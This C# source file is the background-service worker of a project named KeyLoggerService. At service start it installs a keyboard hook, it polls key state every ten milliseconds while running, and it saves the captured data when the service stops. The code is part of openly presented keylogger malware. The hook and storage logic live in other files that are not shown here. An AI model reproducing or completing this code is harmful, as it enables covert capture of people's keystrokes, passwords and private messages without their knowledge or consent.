using KeyLoggerService.HookSetting;
using KeyLoggerService.HookSetting.HookManager;
using Microsoft.Extensions.Hosting;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerService.Service
{
    internal class Worker : BackgroundService
    {
        private KeyHookSet _keyHookSet;
        private readonly string _projDirectory = Directory.GetCurrentDirectory();

        public override Task StartAsync(CancellationToken cancellationToken)
        {
            _keyHookSet = new KeyHookSet();

            Directory.CreateDirectory(Path.Combine(_projDirectory, "Data"));

            try
            {
                _keyHookSet.Start();
            }
            catch (Exception ex)
            {
                File.AppendAllText(
                    Path.Combine(AppContext.BaseDirectory, "Data", "ExeptionLog.txt"),
                    $"[{DateTime.Now}]  --  {ex.Message}  --  {ex.StackTrace}");
                _keyHookSet.ShutdownHook();
                throw;
            }
            return base.StartAsync(cancellationToken);
        }



        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            try
            {
                while (!stoppingToken.IsCancellationRequested)
                {
                    NativeMethods.GetAsyncKeyState(0); 
                    await Task.Delay(10, stoppingToken); 
                }
            }
            catch (TaskCanceledException)
            {
               
            }
        }

        public override Task StopAsync(CancellationToken cancellationToken)
        {
            _keyHookSet.SaveDataCallback(null);
            _keyHookSet.ShutdownHook();

            return base.StopAsync(cancellationToken);
        }

    }
}
